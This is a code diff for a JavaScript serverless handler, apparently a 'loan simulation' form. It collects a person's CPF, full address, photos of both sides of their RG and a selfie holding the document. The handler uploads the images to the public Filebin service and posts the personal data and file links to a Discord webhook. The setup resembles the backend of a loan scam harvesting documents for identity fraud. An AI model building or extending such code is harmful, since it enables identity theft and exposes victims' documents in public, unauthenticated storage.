@@ -39,53 +39,49 @@ export default async function handler(req, res) {
 
     // Extrai campos de texto
     const cpf = fields.cpf ? fields.cpf[0] : null;
-    const tipoRenda = fields.tipoRenda ? fields.tipoRenda[0] : null; // Novo campo
+    const tipoRenda = fields.tipoRenda ? fields.tipoRenda[0] : null;
+    
+    // Novos campos de endereço
+    const cep = fields.cep ? fields.cep[0] : null;
+    const logradouro = fields.logradouro ? fields.logradouro[0] : null;
+    const numero = fields.numero ? fields.numero[0] : null;
+    const complemento = fields.complemento ? fields.complemento[0] : null;
+    const bairro = fields.bairro ? fields.bairro[0] : null;
+    const cidade = fields.cidade ? fields.cidade[0] : null;
+    const estado = fields.estado ? fields.estado[0] : null;
 
-    // Extrai arquivos (array se múltiplos, mas esperamos um por campo)
+    // Extrai arquivos
     const rgFrenteFile = files.rgFrente ? files.rgFrente[0] : null;
     const rgVersoFile = files.rgVerso ? files.rgVerso[0] : null;
-    const cpfDocumentoFile = files.cpfDocumento ? files.cpfDocumento[0] : null; // NOVO: Extrai o arquivo do CPF
-    const comprovanteResidenciaFile = files.comprovanteResidencia ? files.comprovanteResidencia[0] : null;
-    const comprovanteRendaFile = files.comprovanteRenda ? files.comprovanteRenda[0] : null; // Opcional
+    const fotoSegurandoDocumentoFile = files.fotoSegurandoDocumento ? files.fotoSegurandoDocumento[0] : null; // NOVO
 
     const DISCORD_WEBHOOK_URL4 = process.env.DISCORD_WEBHOOK_URL4;
 
     // Validação de campos obrigatórios
-    // NOVO: Inclui cpfDocumentoFile na validação
-    if (!cpf || !tipoRenda || !rgFrenteFile || !rgVersoFile || !cpfDocumentoFile || !comprovanteResidenciaFile || !DISCORD_WEBHOOK_URL4) {
+    if (!cpf || !tipoRenda || !cep || !logradouro || !numero || !bairro || !cidade || !estado || 
+        !rgFrenteFile || !rgVersoFile || !fotoSegurandoDocumentoFile || !DISCORD_WEBHOOK_URL4) {
         // Limpa arquivos temp
-        const allFilesToClean = [rgFrenteFile, rgVersoFile, cpfDocumentoFile, comprovanteResidenciaFile, comprovanteRendaFile].filter(Boolean);
+        const allFilesToClean = [rgFrenteFile, rgVersoFile, fotoSegurandoDocumentoFile].filter(Boolean);
         allFilesToClean.forEach(f => {
             if (f && f.filepath) fs.unlinkSync(f.filepath);
         });
-        return res.status(400).json({ error: 'Dados incompletos: CPF, Tipo de Renda, RG (Frente e Verso), Documento do CPF e Comprovante de Residência são obrigatórios.' });
+        return res.status(400).json({ error: 'Dados incompletos: CPF, Tipo de Renda, Endereço completo e Documentos (RG Frente, RG Verso, Foto segurando documento) são obrigatórios.' });
     }
 
     // Validações de tipo e tamanho de arquivo
     const allowedImageTypes = ['image/png', 'image/jpeg', 'image/jpg'];
-    const allowedPdfTypes = ['application/pdf'];
-    // NOVO: Inclui cpfDocumentoFile no array allFiles
-    const allFiles = [rgFrenteFile, rgVersoFile, cpfDocumentoFile, comprovanteResidenciaFile, comprovanteRendaFile].filter(Boolean); // Filtra nulos
+    const allFiles = [rgFrenteFile, rgVersoFile, fotoSegurandoDocumentoFile].filter(Boolean); // Filtra nulos
 
     for (const file of allFiles) {
         const mimeType = file.mimetype || '';
-        let isAllowed = false;
-
-        // RG (Frente e Verso) e Documento do CPF só aceitam imagens
-        if (file === rgFrenteFile || file === rgVersoFile || file === cpfDocumentoFile) { // NOVO: Adiciona cpfDocumentoFile
-            isAllowed = allowedImageTypes.includes(mimeType);
-        }
-        // Comprovantes aceitam imagens e PDF
-        else if (file === comprovanteResidenciaFile || file === comprovanteRendaFile) {
-            isAllowed = allowedImageTypes.includes(mimeType) || allowedPdfTypes.includes(mimeType);
-        }
-
-        if (!isAllowed) {
+        
+        // Todos os arquivos aceitam apenas imagens
+        if (!allowedImageTypes.includes(mimeType)) {
             allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
-            return res.status(400).json({ error: `Tipo de arquivo inválido para ${file.originalFilename}: só PNG, JPEG, JPG ou PDF (para comprovantes).` });
+            return res.status(400).json({ error: `Tipo de arquivo inválido para ${file.originalFilename}: só PNG, JPEG ou JPG são aceitos.` });
         }
         if (file.size > 5 * 1024 * 1024) {
-            allFiles.forEach(f => { if (f.filepath) fs.unlinkSync(f.filepath); });
+            allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
             return res.status(400).json({ error: `Arquivo ${file.originalFilename} muito grande: máximo 5MB.` });
         }
     }
@@ -94,6 +90,12 @@ export default async function handler(req, res) {
     if (cpf.replace(/\D/g, '').length !== 11) {
         allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
         return res.status(400).json({ error: 'CPF inválido: deve ter 11 dígitos.' });
+    }
+    
+    // Validação CEP (8 dígitos)
+    if (cep.replace(/\D/g, '').length !== 8) {
+        allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
+        return res.status(400).json({ error: 'CEP inválido: deve ter 8 dígitos.' });
     }
 
     try {
@@ -105,7 +107,7 @@ export default async function handler(req, res) {
 
         // Função auxiliar para upload de um arquivo
         async function uploadToFilebin(file, prefix) {
-            if (!file) return null; // Retorna null se o arquivo não for fornecido (para opcionais)
+            if (!file) return null; // Retorna null se o arquivo não for fornecido
 
             const ext = file.originalFilename ? file.originalFilename.split('.').pop() : 'bin'; // Default para 'bin' se não tiver extensão
             const filename = `${prefix}-${cpfLimpo}-${timestamp}.${ext}`;
@@ -130,18 +132,18 @@ export default async function handler(req, res) {
         }
 
         // Uploads paralelos para os arquivos
-        // NOVO: Inclui upload do cpfDocumentoFile
-        const [linkRgFrente, linkRgVerso, linkCpfDocumento, linkComprovanteResidencia, linkComprovanteRenda] = await Promise.all([
+        const [linkRgFrente, linkRgVerso, linkFotoSegurandoDocumento] = await Promise.all([
             uploadToFilebin(rgFrenteFile, 'rg-frente'),
             uploadToFilebin(rgVersoFile, 'rg-verso'),
-            uploadToFilebin(cpfDocumentoFile, 'cpf-documento'), // NOVO: Upload do documento do CPF
-            uploadToFilebin(comprovanteResidenciaFile, 'comprovante-residencia'),
-            uploadToFilebin(comprovanteRendaFile, 'comprovante-renda') // Opcional, pode retornar null
+            uploadToFilebin(fotoSegurandoDocumentoFile, 'foto-segurando-documento') // NOVO
         ]);
 
         // Limpa arquivos temp
         allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
 
+        // Formata o endereço completo
+        const enderecoCompleto = `${logradouro}, ${numero}${complemento ? ', ' + complemento : ''} - ${bairro}, ${cidade}/${estado}`;
+        
         // Notificação para Discord
         const discordPayload = {
             username: 'Nova Simulação de Empréstimo',
@@ -154,12 +156,10 @@ export default async function handler(req, res) {
                     fields: [
                         { name: 'CPF', value: cpf, inline: true },
                         { name: 'Tipo de Renda', value: tipoRenda, inline: true },
+                        { name: 'Endereço Completo', value: enderecoCompleto, inline: false },
                         { name: 'RG - Frente', value: `[Visualizar](${linkRgFrente})`, inline: false },
                         { name: 'RG - Verso', value: `[Visualizar](${linkRgVerso})`, inline: false },
-                        { name: 'Documento do CPF', value: `[Visualizar](${linkCpfDocumento})`, inline: false }, // NOVO: Link do documento do CPF
-                        { name: 'Comprovante de Residência', value: `[Visualizar](${linkComprovanteResidencia})`, inline: false },
-                        // Adiciona o comprovante de renda apenas se ele foi enviado
-                        ...(linkComprovanteRenda ? [{ name: 'Comprovante de Renda', value: `[Visualizar](${linkComprovanteRenda})`, inline: false }] : []),
+                        { name: 'Foto segurando documento', value: `[Visualizar](${linkFotoSegurandoDocumento})`, inline: false }, // NOVO
                     ],
                     timestamp: new Date().toISOString(),
                     footer: { text: 'Filebin via Vercel Proxy' },
@@ -186,9 +186,7 @@ export default async function handler(req, res) {
             links: { 
                 rgFrente: linkRgFrente, 
                 rgVerso: linkRgVerso, 
-                cpfDocumento: linkCpfDocumento, // NOVO: Inclui o link do documento do CPF
-                comprovanteResidencia: linkComprovanteResidencia,
-                comprovanteRenda: linkComprovanteRenda // Inclui o link opcional
+                fotoSegurandoDocumento: linkFotoSegurandoDocumento // NOVO
             }
         });
 
